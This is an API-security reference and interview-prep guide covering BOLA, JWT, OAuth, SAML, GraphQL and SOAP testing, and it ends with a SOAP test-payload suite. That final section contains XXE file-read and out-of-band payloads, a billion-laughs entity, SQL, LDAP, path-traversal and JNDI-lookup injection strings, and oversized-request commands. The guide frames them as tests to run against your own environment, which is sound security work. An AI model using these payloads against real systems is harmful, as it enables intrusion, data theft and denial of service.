# API Security - Reference & Interview Prep

REST, SOAP and GraphQL, plus token-based authentication (JWT, OAuth). Vulnerabilities follow the same **What -> Why -> How -> Impact -> Mitigations** shape used in [web-security.md](web-security.md); session/cookie/auth basics and the full rate-limit/SSRF detail live there.

---

## 1. Fundamentals

### Why API security is treated as a distinct discipline
APIs are consumed by arbitrary clients - mobile apps, other services, scripts - with no browser enforcing the Same-Origin Policy, CSP or cookie rules. There is no client-side safety net, so authorization has to be enforced server-side on every single request, which is exactly the check teams most often forget. That is why Broken Object Level Authorization is the number-one API risk.

### How API testing differs from web app testing
There is usually no rendered UI to walk, so you work from captured traffic, an OpenAPI/Swagger spec, or a Postman collection. The emphasis shifts away from output-rendering bugs (like reflected XSS) toward object- and function-level authorization, token handling, mass assignment, excessive data exposure, and resource consumption.

### OWASP API Security Top 10 (2023)
1. **BOLA** - Broken Object Level Authorization (the API form of IDOR).
2. **Broken Authentication** - weak JWT validation, missing/short token expiry, credential stuffing, leaked keys.
3. **Broken Object Property Level Authorization** - excessive data exposure plus mass assignment.
4. **Unrestricted Resource Consumption** - no rate/size/complexity limits (DoS, cost abuse).
5. **BFLA** - Broken Function Level Authorization.
6. **Unrestricted Access to Sensitive Business Flows** - automated abuse of a legitimate flow (bulk buying, mass sign-ups).
7. **SSRF**.
8. **Security Misconfiguration**.
9. **Improper Inventory Management** - old/undocumented/shadow versions still live.
10. **Unsafe Consumption of APIs** - blindly trusting third-party/partner API data.

### How do you test an API with no documentation?
Capture traffic from the web or mobile client; hunt for spec files (`/swagger.json`, `/api-docs`, `/v2/api-docs`); read JS bundles for endpoints; fuzz paths with ffuf; try older versions (`/v1/` when the app uses `/v2/`); change HTTP methods (GET -> PUT/DELETE); and discover parameters with Arjun.

### API types, and SOAP vs REST
**Types.** **REST** (HTTP/JSON, stateless), **SOAP** (XML, strict, WS-Security), **GraphQL** (single endpoint, client-defined queries), **gRPC** (HTTP/2, protobuf), and **WebSocket** (full-duplex). **SOAP vs REST:** SOAP is **XML-only, a protocol with strict standards, built-in WS-Security, stateful-capable** (heavy, used in banking/enterprise); REST is **lightweight, JSON/HTTP, stateless, flexible** (modern APIs). SOAP vulns skew to **XXE/XML**, REST to **BOLA/BFLA/mass-assignment**.

### WebSocket API testing
**Full-duplex, persistent connection** over `ws://`/`wss://`. Test: **origin validation (CSWSH - cross-site WebSocket hijacking)**, **authentication on the handshake and per-message**, **injection in messages (SQLi/XSS)**, **lack of rate limiting**, and **cleartext `ws://`**. Use **Burp's WebSocket history** to intercept/replay frames.

---

## 2. Authorization

### Broken Object Level Authorization (BOLA / API-IDOR)
**What it is.** An endpoint returns or modifies an object identified by an ID without verifying the caller owns it.

**Why it happens.** Authentication passes (the token is valid) but authorization - "does this user own *this* object" - is never separately checked.

**How you test it.** Authenticated as user A, request your own object (`GET /api/orders/1001`), then change the ID (`/orders/1002`) and see if another user's data returns. It applies to UUIDs too (not enumerable, still unchecked) and to nested child objects where only the parent is checked.

**Impact.**
- Reading or modifying other users' data
- Mass exposure when IDs are enumerable

**Mitigations.**
- Scope every object fetch at the query level (`WHERE id=? AND customer_id=?`)
- Return identical 404s whether the object is missing or simply not yours
- Add automated tests asserting A cannot fetch B's known ID

### Broken Function Level Authorization (BFLA)
**What it is.** A user can call a function/endpoint their role should not permit - the authorization gap is about the *action*, not the object.

**Why it happens.** The endpoint checks only that a valid token exists, never that the token's role is allowed to perform this action.

**How you test it.** Call admin or privileged endpoints (found in docs or JS) with a normal user's token, e.g. `POST /api/admin/users/{id}/promote`, and see if it succeeds.

**Impact.**
- Vertical escalation to admin functionality
- Horizontal abuse of another role's functions

**Mitigations.**
- Enumerate every endpoint by intended role and enforce role checks server-side on each
- Explicitly test every "restricted" endpoint with a lower-privileged and an unauthenticated token

### Broken Object Property Level Authorization: Mass Assignment & Excessive Data Exposure
**What it is.** Two sides of the same problem. **Mass assignment** is the server binding the whole client JSON body to an internal model, so a client can set fields it shouldn't. **Excessive data exposure** is the API returning full objects (including sensitive fields) and relying on the frontend to hide them.

**Why it happens.** Convenient framework auto-binding (`Model.update(req.body)`) writes any field present on the model, and default serializers return the whole model rather than a tailored view.

**How you test it.** For mass assignment, add fields the UI never exposes to a request body - `"role":"admin"`, `"isVerified":true`, `"balance":99999`, `"account_tier":"enterprise"` - and check whether they persist. For excessive exposure, read raw responses in Burp (not the UI) looking for password hashes, other users' emails, or internal flags.

**Impact.**
- Privilege escalation
- Data tampering
- Sensitive-data disclosure

**Mitigations.**
- Use an explicit allow-list of client-writable fields per endpoint (DTOs)
- Never bind the raw request body
- In Laravel use `$fillable`
- Not `$guarded = []`
- Put privileged fields behind their own authorized endpoint
- Return only the fields each client needs via response DTOs

### Gateway vs service-level responsibilities
A gateway should handle coarse cross-cutting controls - TLS termination, authentication, global rate limiting, schema validation - while each service still enforces fine-grained, resource-level (BOLA-style) authorization. Assuming "the gateway already did auth" and skipping in-service ownership checks is the single most common path to BOLA.

---

## 3. JSON Web Tokens (JWT)

**What it is.** A JWT is a compact, URL-safe token for transmitting signed claims as a JSON object, widely used for authentication and authorization. It has three dot-separated parts: a **header** (metadata such as `{"alg":"HS256","typ":"JWT"}`), a **payload** (claims such as `{"userId":123,"role":"admin","exp":...}`), and a **signature** (e.g. `HMACSHA256(base64url(header) + "." + base64url(payload), secret)`). In a typical flow the user logs in, the server issues a JWT, the client stores it (localStorage, sessionStorage or a cookie) and sends it as `Authorization: Bearer <token>`, and the server verifies the signature on each request.

**Why it becomes vulnerable.** JWTs are not insecure by design - bad implementation makes them so: allowing `alg:none` or mixing HS256/RS256 (signature bypass), weak signing secrets (brute-forceable), no expiry or revocation (a leaked token stays valid), storing tokens in localStorage (XSS theft) or in cookies without `SameSite`/`HttpOnly` (CSRF), unvalidated claims (tampered `role`/`admin`), and skipping signature verification entirely (any token accepted). Remember the payload is only base64-encoded, not encrypted, so anyone can read it.

**How you test and exploit it.** Decode the token (jwt.io, `jwt_tool`) and read the claims, then try the known attacks:
- **None-algorithm attack** - set `alg:none` and strip the signature; if accepted, forge any token.
- **Algorithm confusion (RS256 -> HS256)** - if the server accepts both and uses the RSA public key as the HMAC secret, sign a forged token with that public key.
- **Key injection / key confusion** - supply your own key via a `jwk`/`jku`/`x5u` header and see if the server verifies against it; `kid` injection via path traversal or SQLi in the key ID.
- **Weak-secret brute force** - crack an HS256 secret with hashcat/`jwt_tool` and re-sign.
- **Expired-token replay / token replay** - reuse a previously valid token, or replay the same token across endpoints, where expiry/replay are not enforced.
- **XSS token theft** - steal a JWT from localStorage/sessionStorage via XSS.
- **Improper revocation** - confirm old tokens still work after logout or access removal.
- **Refresh-token replay** - use a stolen refresh token (not bound to session/IP) to mint new access tokens.
- **Claim injection/tampering** - tamper `sub`/`iss`/`aud`/`role` if claims aren't validated server-side, to impersonate or escalate.

**Impact.**
- Authentication bypass
- Impersonation
- Privilege escalation
- Persistent access via un-revocable tokens

**Mitigations.**
- Pin one expected algorithm server-side (never trust the token's `alg`)
- Use strong secrets or properly separated asymmetric keys
- Enforce short expiry with a revocable refresh-token pattern (and a blacklist/denylist where revocation is required)
- Validate all claims (`sub`, `iss`, `aud`, `exp`) server-side
- Keep sensitive data out of the payload
- Prefer `HttpOnly`+`Secure`+`SameSite` cookies over localStorage for browser clients

### Where should a JWT be stored client-side?
`HttpOnly`+`Secure`+`SameSite` cookies are safest against XSS theft (script can't read them) but reintroduce CSRF, so pair them with CSRF tokens. localStorage/sessionStorage is readable by any XSS on the origin - one stored XSS equals full token theft - so only use it with heavy XSS controls (CSP, output encoding).

### Which is weaker, RS256 or HS256?
Neither is inherently "weak," but **HS256 is riskier in JWT** because it's **symmetric** - the **same secret signs and verifies**, so if the secret leaks (or is weak/brute-forced), anyone can forge tokens. **RS256 is asymmetric** - the server signs with a **private key** and clients verify with the **public key**, so a leaked public key doesn't allow forgery. The classic attack is the **RS256 -> HS256 confusion** (forcing the server to verify an HS256 token using the public key as the HMAC secret).

### How do you revoke or force-logout a stateless JWT?
This is the hard part of stateless JWT: a signed, un-expired token is valid *by definition*, so deleting it on the client does not stop a stolen copy. Server-side options, usually combined:
- **Short-lived access tokens + refresh tokens** - keep access tokens to minutes; store **refresh tokens server-side** so they can be revoked, and **rotate** them on each use (reuse of a rotated refresh token signals theft and should kill the family).
- **Denylist / blocklist by `jti`** - give each token a unique `jti` claim and keep a denylist (e.g. Redis with TTL = token lifetime) of revoked `jti`s checked on every request; reintroduces a little state but enables immediate revocation.
- **Per-user token version / `tokenValidFrom`** - store a `tokenVersion` or `tokenValidFrom` timestamp per user, put it in the token, and compare on each request. Bump it on **logout, password/MPIN change, or suspected compromise** to invalidate every token issued earlier in a single write - the standard "log out everywhere / kill old tokens after password change" mechanism.
- **Short idle + absolute session caps**, and re-authentication (step-up) for sensitive actions.

**Test.** after logout or password change, confirm the old access token no longer works; reuse a token across endpoints and after access is removed; replay a refresh token.

### Spring Security filter chain (how JWT auth is wired)
A request passes through an ordered chain of servlet filters: `SecurityContextPersistenceFilter` -> the **authentication filter** (`UsernamePasswordAuthenticationFilter`, or a custom **JWT filter** that extracts and validates the `Bearer` token and sets the `Authentication` in the `SecurityContext`) -> `ExceptionTranslationFilter` -> `FilterSecurityInterceptor` (the authorization decision). Knowing the chain shows you *where* a check can be missing - e.g. a JWT filter that verifies the signature but never checks `exp`/`tokenVersion`, or an endpoint mapped outside the secured chain so it is never authenticated at all.

---

## 4. OAuth 2.0

**What it is.** OAuth is an open standard for **access delegation** - it lets a user authorize a third-party app to access their data on another service (Google, Facebook, GitHub) without sharing their password. It is what sits behind "Login with Google". The key roles are the **resource owner** (the user), the **client** (the requesting app), the **authorization server** (authenticates the user and issues tokens), the **resource server** (hosts the data), and the **access token** (the temporary credential).

**How the flow works (Authorization Code grant).** The client redirects the user to the authorization server to log in; the user authenticates and grants permission; the authorization server redirects back with an authorization **code**; the client exchanges that code for an **access token** at the token endpoint; the client then uses the token to call the resource server.

**Why it becomes vulnerable, and how you test it.**
- **Misconfigured redirect URIs** - loose matching or wildcards let an attacker redirect the code/token to a site they control (chain with open redirect -> token leak).
- **CSRF in the OAuth flow** - if the client doesn't validate the `state` parameter, an attacker can force the victim to authorize the attacker's context.
- **Token leakage via Referrer** - tokens placed in the URL leak through `Referer` headers and logs.
- **Authorization-code interception** - over an insecure channel, or on mobile where a malicious app registers the same custom URI scheme, the code can be stolen.
- **Client impersonation** - a leaked client secret lets an attacker impersonate the client.
- **Implicit flow** - deprecated for SPAs because the token is exposed directly in the URL.

**Impact.**
- Account takeover via stolen codes/tokens
- Unauthorized access to delegated resources
- Scope escalation

**Mitigations.**
- Use **PKCE** for public/mobile/SPA clients
- Pre-register and strictly validate exact **redirect URIs** (no wildcards/open redirects)
- Use and verify the **`state`** parameter to stop CSRF
- Enforce **HTTPS** throughout
- Never put tokens in the URL and avoid the implicit flow
- Issue **short-lived access tokens** with refresh tokens
- Apply least-privilege **scopes**

### OAuth2 vs OpenID Connect (OIDC)
OAuth2 handles authorization (delegated access, issues access tokens). OIDC is an identity layer on top that also issues an ID token (a JWT proving *who* the user is). "Login with Google" is really OIDC. Never treat a bare OAuth2 access token as proof of identity.

### Why PKCE is needed for public clients
Public clients can't keep a secret, so a malicious app registering the same redirect URI could intercept the authorization code and exchange it. PKCE binds the code to a `code_verifier` only the legitimate client holds, so an intercepted code is useless without it.

### SAML SSO vulnerabilities
**What it is.** SAML (Security Assertion Markup Language) is an XML-based single-sign-on standard: an Identity Provider (IdP) issues a digitally signed *assertion* vouching for the user to a Service Provider (SP). Where OAuth/OIDC pass signed tokens, SAML passes signed XML - and almost all of its vulnerabilities come from mishandling that signed XML.

**Why it becomes vulnerable.** The SP must verify an XML signature over XML the attacker can see and manipulate, and XML's flexibility (comments, canonicalisation quirks, multiple same-named elements) makes correct signature validation hard to implement.

**How you test and exploit it.**
- **XML Signature Wrapping (XSW)** - add a second, unsigned assertion (or relocate the signed one) so the SP validates the signature against the original element but reads identity from the attacker-injected element: change the user to `admin` while keeping a technically valid signature. Burp's **SAML Raider** automates the XSW permutations.
- **Assertion injection / unsigned assertions** - if the SP accepts assertions with a missing signature, or signs only part of the document, inject or edit claims such as `NameID` and role attributes.
- **Signature stripping / algorithm downgrade** - remove the signature element, or force a weak/`none` algorithm, if the SP doesn't strictly enforce one.
- **Comment injection in `NameID`** - e.g. `admin@x.com<!---->.evil.com` to exploit parser/canonicalisation differences and impersonate another user.
- **Missing condition checks** - `Recipient`, `Audience`, `InResponseTo` and `NotOnOrAfter` not validated enable assertion replay and cross-SP reuse.

**Impact.**
- Full authentication bypass and impersonation of any user
- Including administrators

**Mitigations.**
- Validate the signature over the whole assertion with a vetted library
- Reject unsigned or partially-signed assertions
- Pin the expected IdP certificate
- Enforce `Recipient`/`Audience`/`InResponseTo`/`NotOnOrAfter`
- Never hand-roll XML/signature handling. For new applications
- Prefer OIDC over SAML

---

## 5. GraphQL

**What it is.** GraphQL (from Facebook) is a query language and runtime for APIs. The client asks for exactly the fields it wants from a single endpoint (typically `/graphql`), against a strongly typed schema, with hierarchical/nested queries - so there is no over- or under-fetching and multiple resources can be retrieved in one request. For example a query for `user(id:"123"){ name email posts{ title published } }` returns just those fields as JSON. The benefits over REST are precise fetching, fewer round-trips, and a typed schema that tools can auto-document.

**Why it becomes vulnerable.** The client composes arbitrary nested traversals of the data graph, so if authorization or cost limits are enforced only at the query root (not in each field resolver), deeper or aliased fields go unchecked; schema introspection can leak the entire API; and batching lets one request contain many operations.

**How you test and exploit it.**
- Find the endpoint (`/graphql`, `/graphiql`, `/api/graphql`).
- **Introspection** - `{__schema{types{name fields{name}}}}` dumps the schema; if disabled, rebuild it from field suggestions (Clairvoyance).
- **IDOR** via queries using other users' IDs, and **mutations** that lack authorization.
- **Batching / aliasing** - send many operations (or alias the same sensitive field many times) in one request to brute-force OTPs/logins past rate limits or bulk-extract data past a root-only auth check.
- **Deep nested queries** for denial of service.
- **Injection** inside arguments.
- Tools: InQL (Burp), GraphQL Voyager, graphw00f.

**Impact.**
- Schema/data disclosure
- Authorization bypass
- Rate-limit bypass
- Resource-exhaustion DoS

**Mitigations.**
- Enforce a maximum query depth and a computed cost/complexity budget at the validation layer
- Disable introspection and batching in production
- Enforce authorization inside every field resolver
- Not just at the query root

### A GraphQL attack with no REST equivalent
Field aliasing/batching to defeat a root-level-only authorization or rate-limit check, and nested-query resource exhaustion from a single small-looking request - both come from the client being able to compose arbitrary nested graph traversals.

---

## 6. SOAP

**What it is.** SOAP (Simple Object Access Protocol) is a strict, XML-based messaging protocol for web services, still common in enterprise, banking, telecom and legacy systems. Every message is an XML **envelope** (header + body), the service is described by a **WSDL** contract that lists all operations/parameters/types, and security is often layered on with **WS-Security** (signatures, encryption, `UsernameToken`). Unlike REST's lightweight JSON over HTTP verbs, SOAP is transport-agnostic, rigidly typed, and verbose - which makes the WSDL a complete map of the attack surface and the XML parser a rich source of bugs.

**Why it becomes vulnerable.** It is XML end-to-end, so every XML weakness applies (external entities, entity expansion, signature-wrapping); the WSDL exposes every operation including ones the client never calls; routing by the `SOAPAction` header can be desynchronised from the body; and WS-Security is hard to implement correctly (unsigned elements accepted, timestamps not enforced, signatures not covering the whole body).

**How you test and exploit it.**
**Get the contract.** `?wsdl`, `?singleWsdl`; load in Burp (**Wsdler**), SoapUI or Postman to enumerate and invoke every operation - then check authorization per operation, including ones the UI never triggers.
- **XXE** in the SOAP body - external entity to read files or SSRF internal services; **XML bomb / Billion Laughs** for DoS.
- **SOAPAction spoofing** - send operation A's body with operation B's `SOAPAction` header to bypass routing or authorization checks keyed on one but not the other.
- **WS-Security attacks** - `UsernameToken` replay or plaintext/digest weaknesses; timestamp-expiry not enforced (replay); **XML Signature Wrapping** (move the signed element while swapping the executed one, as in SAML XSW); accepting an unsigned or re-signed body.
- **Injection inside XML fields** - SQLi, command injection, and XPath injection in element values; verbose SOAP **faults** leaking stack traces and internals.

**Impact.**
- File read/SSRF (XXE)
- Authentication/authorization bypass (SOAPAction, signature wrapping)
- DoS (XML bomb)
- Data disclosure via faults

**Mitigations.**
- Disable external entity and DTD processing in the XML parser
- Validate against the schema
- Enforce authorization per operation (not per endpoint)
- Require WS-Security signatures over the whole body with timestamp/nonce replay protection
- Return generic SOAP faults. Tools: `SoapUI`
- Burp `Wsdler` + `SAML Raider`
- `wsdl2java`

---

## 7. Resource consumption, inventory & third parties

### Rate limiting
Rate limiting caps how many requests an identity can make in a window; its absence enables brute force, credential stuffing and DoS. API limits must be per-identity (token/key), tiered by endpoint cost, and capped on payload/result size - not just per-IP. The full testing-and-bypass detail (scope, header spoofing, IP rotation, parallel-burst races, alternate endpoints) is in [web-security.md](web-security.md#rate-limiting-and-bypass).

### Improper inventory management (shadow APIs)
**What it is.** Undocumented, deprecated or forgotten endpoints still live and unprotected - old app-version endpoints, debug endpoints shipped by accident, one-off integrations.

**How you test it.** Enumerate via JS bundles, the Wayback Machine, and `/api/v1/` fuzzing; a decompiled mobile app often reveals routes like `/v2/debug/dump-user-session`.

**Mitigations.**
- Route all traffic through one gateway with default-deny for unregistered routes
- Strip debug endpoints at build time
- Run continuous API discovery against the documented inventory

### Unsafe consumption of third-party APIs
**What it is.** Trusting upstream/partner responses without the validation applied to user input - e.g. a forged payment-processor webhook with no signature check credits an order as paid.

**Mitigations.**
- Treat every third-party response as untrusted: verify webhook signatures (HMAC)
- Validate schemas
- Don't blindly follow redirects from partner responses

### SSRF via a webhook/import feature
A "fetch this URL" field reaches internal targets; DNS rebinding can pass a naive hostname check before the fetch hits `169.254.169.254` or an internal service. Resolve DNS and validate the actual IP against blocked ranges immediately before each fetch, including on every redirect hop. Full SSRF detail is in [web-security.md](web-security.md#server-side-request-forgery-ssrf).

### Token replay and API keys
Protect against **token replay** with short lifetimes, strict `aud` validation, one-time nonces/tracked IDs, and TLS everywhere. For **API keys and secrets**, look in JS files, mobile app resources (`strings.xml`, decompiled code), public GitHub, error messages and the Wayback Machine, then check what the key unlocks and whether it is properly scoped.

### Replay protection, request signing & idempotency
TLS stops passive sniffing but **not replay** - a captured valid request can be re-sent. For high-value/financial APIs, layer:
- **Nonce + timestamp** - each request carries a unique nonce and a timestamp; the server rejects stale timestamps and remembers recently-seen nonces, so a replayed request is refused.
- **HMAC request signing** - the client signs method + path + body (+ timestamp + nonce) with a secret key; the server recomputes and compares, so a tampered or replayed request fails the signature.
- **Idempotency keys (payments/transfers)** - the client sends a unique `Idempotency-Key` per transaction; the server **stores it with the result and returns the stored result instead of re-executing** if the same key arrives again, so a retry, double-click or replay cannot transfer twice. Back it with a DB unique constraint and an atomic transaction.
- **Parameter tampering** - never trust client-sent `amount`/`accountId`/`role`; re-fetch and re-authorize every field server-side.
- **Excessive data exposure (API #3)** - return tailored DTOs, not full objects; apply field-level masking (card/account numbers); never rely on the client to hide fields.
- **Concurrency** - money movement needs atomic operations + row locking (see Race Condition in [web-security.md](web-security.md)) plus per-account/IP rate limiting.

---

## 8. SOAP service-to-service (S2S) test payloads

Assumptions (change to match your WSDL): endpoint `https://api.example.com/orders/v1`, namespace `http://example.com/orders` (prefix `ns`), operations `GetOrderStatus` / `CreateOrder`, SOAP 1.1 (`Content-Type: text/xml; charset=utf-8`), auth WS-Security UsernameToken. Headers for most calls:
```
POST /orders/v1 HTTP/1.1
Host: api.example.com
Content-Type: text/xml; charset=utf-8
SOAPAction: "http://example.com/orders/GetOrderStatus"
```

### Functional

**F-01 Valid request, mandatory fields (GetOrderStatus)** - expected HTTP 200, `GetOrderStatusResponse` with status for order 12345.
```xml
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"
                  xmlns:ns="http://example.com/orders"
                  xmlns:wsse="http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-wssecurity-secext-1.0.xsd">
  <soapenv:Header>
    <wsse:Security>
      <wsse:UsernameToken>
        <wsse:Username>svc_account</wsse:Username>
        <wsse:Password>CHANGE_ME</wsse:Password>
      </wsse:UsernameToken>
    </wsse:Security>
  </soapenv:Header>
  <soapenv:Body>
    <ns:GetOrderStatusRequest>
      <ns:OrderId>12345</ns:OrderId>
    </ns:GetOrderStatusRequest>
  </soapenv:Body>
</soapenv:Envelope>
```

**F-02 CreateOrder with mandatory + optional fields**
```xml
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"
                  xmlns:ns="http://example.com/orders">
  <soapenv:Header>
    <!-- same wsse:Security block as F-01 -->
  </soapenv:Header>
  <soapenv:Body>
    <ns:CreateOrderRequest>
      <ns:CorrelationId>9f1c2b7e-3d44-4a8e-9a55-0e6a1f2b7c10</ns:CorrelationId>
      <ns:CustomerId>CUST-1001</ns:CustomerId>
      <ns:OrderDate>2026-11-06T10:30:00Z</ns:OrderDate>
      <ns:Currency>USD</ns:Currency>
      <ns:Items>
        <ns:Item>
          <ns:Sku>SKU-ABC-001</ns:Sku>
          <ns:Quantity>2</ns:Quantity>
          <ns:UnitPrice>19.99</ns:UnitPrice>
        </ns:Item>
        <ns:Item>
          <ns:Sku>SKU-XYZ-002</ns:Sku>
          <ns:Quantity>1</ns:Quantity>
          <ns:UnitPrice>5.50</ns:UnitPrice>
        </ns:Item>
      </ns:Items>
      <ns:Notes>Leave at front desk</ns:Notes>
      <ns:ShippingMethod>EXPRESS</ns:ShippingMethod>
    </ns:CreateOrderRequest>
  </soapenv:Body>
</soapenv:Envelope>
```

**F-07 Idempotency.** send F-02 twice with the same `CorrelationId`. Expected: second call returns the same OrderId (or a defined duplicate response), and only one order exists.

### Request validation (negative)
All use the F-02 structure with one defect; only the changed part is shown.
```xml
<!-- V-01 Missing mandatory element (CustomerId removed) -->
<ns:CreateOrderRequest>
  <ns:CorrelationId>v01-0000-4000-8000-000000000001</ns:CorrelationId>
  <ns:OrderDate>2026-11-06T10:30:00Z</ns:OrderDate>
  <ns:Currency>USD</ns:Currency>
  <ns:Items><ns:Item><ns:Sku>SKU-ABC-001</ns:Sku><ns:Quantity>1</ns:Quantity><ns:UnitPrice>19.99</ns:UnitPrice></ns:Item></ns:Items>
</ns:CreateOrderRequest>

<!-- V-02 Wrong data type -->      <ns:Quantity>two</ns:Quantity>
<!-- V-03 Value exceeds max length -->
<ns:CustomerId>CUSTOMER-ID-THAT-IS-FAR-TOO-LONG-0123456789012345678901234567890123456789012345678901234567890123456789</ns:CustomerId>
<!-- V-04 Invalid enum value -->    <ns:ShippingMethod>TELEPORT</ns:ShippingMethod>
<!-- V-05 Invalid date format -->   <ns:OrderDate>06/11/2026 10:30</ns:OrderDate>
<!--      also try: 2026-13-45T25:61:00Z, and an empty string -->
```
```xml
<!-- V-06 Malformed XML (unclosed tag) -->
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:ns="http://example.com/orders">
  <soapenv:Body><ns:GetOrderStatusRequest><ns:OrderId>12345
    </ns:GetOrderStatusRequest></soapenv:Body>
</soapenv:Envelope>

<!-- V-07 Wrong namespace: xmlns:ns="http://wrong.example.com/other" -->
<!-- V-08 Empty body: <soapenv:Body/> -->
<!-- V-09 Wrong SOAPAction header: "http://example.com/orders/DeleteEverything" (also test missing) -->
<!-- V-10 Wrong Content-Type: application/json  with body {"OrderId": 12345} -->
```
```xml
<!-- V-11 xsi:nil on a non-nillable field -->
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"
                  xmlns:ns="http://example.com/orders" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
  <soapenv:Body><ns:GetOrderStatusRequest><ns:OrderId xsi:nil="true"/></ns:GetOrderStatusRequest></soapenv:Body>
</soapenv:Envelope>

<!-- V-12 Special characters / Unicode / CDATA (stored and returned exactly, no corruption/double-encoding) -->
<ns:Notes>Café – 日本語 – العربية – emoji 😀 – &lt;tag&gt; &amp; "quotes" 'apostrophes'</ns:Notes>
<ns:Notes><![CDATA[<script>alert(1)</script> & raw < > characters]]></ns:Notes>

<!-- Boundary values -->
<ns:Quantity>0</ns:Quantity> <ns:Quantity>-1</ns:Quantity> <ns:Quantity>2147483647</ns:Quantity> <ns:Quantity>2147483648</ns:Quantity>
<ns:UnitPrice>0.00</ns:UnitPrice> <ns:UnitPrice>19.999</ns:UnitPrice> <ns:UnitPrice>99999999999.99</ns:UnitPrice>
```

### Authentication and authorization
```xml
<!-- A-01 Valid UsernameToken with timestamp and nonce -->
<soapenv:Header>
  <wsse:Security xmlns:wsse="http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-wssecurity-secext-1.0.xsd"
                 xmlns:wsu="http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-wssecurity-utility-1.0.xsd">
    <wsu:Timestamp wsu:Id="TS-1">
      <wsu:Created>2026-11-06T10:30:00Z</wsu:Created>
      <wsu:Expires>2026-11-06T10:35:00Z</wsu:Expires>
    </wsu:Timestamp>
    <wsse:UsernameToken wsu:Id="UT-1">
      <wsse:Username>svc_account</wsse:Username>
      <wsse:Password Type="http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-username-token-profile-1.0#PasswordText">CHANGE_ME</wsse:Password>
      <wsse:Nonce EncodingType="http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-soap-message-security-1.0#Base64Binary">dGVzdG5vbmNlMTIzNDU2</wsse:Nonce>
      <wsu:Created>2026-11-06T10:30:00Z</wsu:Created>
    </wsse:UsernameToken>
  </wsse:Security>
</soapenv:Header>
<!-- A-02 Invalid password: <wsse:Password>WRONG_PASSWORD</wsse:Password> -->
<!-- A-03 Missing security header: <soapenv:Header/> -->
<!-- A-04 Expired timestamp (Created/Expires in 2020); replay test: send A-01 twice with identical nonce, 2nd rejected -->
<!-- A-07 Insufficient permission: svc_readonly calling CreateOrder -> 403 / authorization Fault -->
<!-- A-08 Token in HTTP header: Authorization: Bearer <valid_token> / X-API-Key: <valid_key> -->
<!-- A-09 Expired / tampered token: Bearer <expired>, Bearer <valid_with_last_chars_altered> -->
```
```bash
# A-05 / A-06 Mutual TLS
curl -v --cert client.pem --key client.key --cacert ca.pem \
  -H "Content-Type: text/xml; charset=utf-8" \
  -H 'SOAPAction: "http://example.com/orders/GetOrderStatus"' \
  -d @F-01.xml https://api.example.com/orders/v1
# expired / wrong-CA / no cert: repeat with those certs, or omit --cert
```

### Error and fault handling
```xml
<!-- E-01 Business rule violation: F-02 with existing CorrelationId, or CustomerId=CUST-BLOCKED -->
<!-- E-02 Resource not found -->      <ns:GetOrderStatusRequest><ns:OrderId>99999999</ns:OrderId></ns:GetOrderStatusRequest>
<!-- E-06 Unsupported SOAP version: Envelope xmlns:soapenv="http://example.com/fake-soap-version" -> VersionMismatch fault -->
<!-- E-07 mustUnderstand header not supported -> MustUnderstand fault -->
<soapenv:Header><ns:UnknownHeader soapenv:mustUnderstand="1">test</ns:UnknownHeader></soapenv:Header>

<!-- Expected SOAP 1.1 fault shape (reference) -->
<soapenv:Fault>
  <faultcode>soapenv:Client</faultcode>
  <faultstring>Order not found</faultstring>
  <detail><ns:OrderFault xmlns:ns="http://example.com/orders"><ns:Code>ORD-404</ns:Code><ns:Message>No order with id 99999999</ns:Message></ns:OrderFault></detail>
</soapenv:Fault>
```

### Security (run only against your own test environment)
```xml
<!-- S-01 XXE (external entity) - expected: rejected (DOCTYPE disallowed), file content never in response -->
<?xml version="1.0"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/hostname"> ]>
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:ns="http://example.com/orders">
  <soapenv:Body><ns:GetOrderStatusRequest><ns:OrderId>&xxe;</ns:OrderId></ns:GetOrderStatusRequest></soapenv:Body>
</soapenv:Envelope>
<!-- S-01b XXE OOB: <!ENTITY xxe SYSTEM "http://YOUR-TEST-LISTENER.example/ping"> - expected: no inbound request -->

<!-- S-02 Entity expansion (reduced "billion laughs") - expected: rejected quickly, CPU/memory flat -->
<?xml version="1.0"?>
<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
  <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
]>
```
```
S-03 Injection strings (put in OrderId, CustomerId, Notes) - expected: treated as data or schema-rejected, no SQL/stack traces:
  ' OR '1'='1
  '; DROP TABLE orders;--
  1 UNION SELECT username,password FROM users--
  *)(uid=*))(|(uid=*
  ' or 1=1 or ''='
  ../../../../etc/passwd
  ${jndi:ldap://YOUR-TEST-LISTENER.example/a}
  <script>alert(1)</script>
```
```bash
# S-04 Oversized payload (~50 MB Notes), deep nesting (10,000 nested elements), huge <Item> count
python3 - <<'EOF'
big = "A" * 50_000_000
open("big.xml","w").write(f"""<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:ns="http://example.com/orders"><soapenv:Body><ns:CreateOrderRequest><ns:Notes>{big}</ns:Notes></ns:CreateOrderRequest></soapenv:Body></soapenv:Envelope>""")
EOF
curl -v -H "Content-Type: text/xml" -d @big.xml https://api.example.com/orders/v1

# S-05 Signature wrapping (outline): take a signed request, add a second unsigned Body/payload (or move the signed
#   one into a Header wrapper) so the signature still verifies while processed content differs. Expected: rejected.
#   Generate with SoapUI WS-Security tooling or WS-Attacker.

# S-06 / S-07 Transport
curl -v http://api.example.com/orders/v1 -d @F-01.xml            # plain HTTP
openssl s_client -connect api.example.com:443 -tls1              # weak TLS
openssl s_client -connect api.example.com:443 -tls1_1
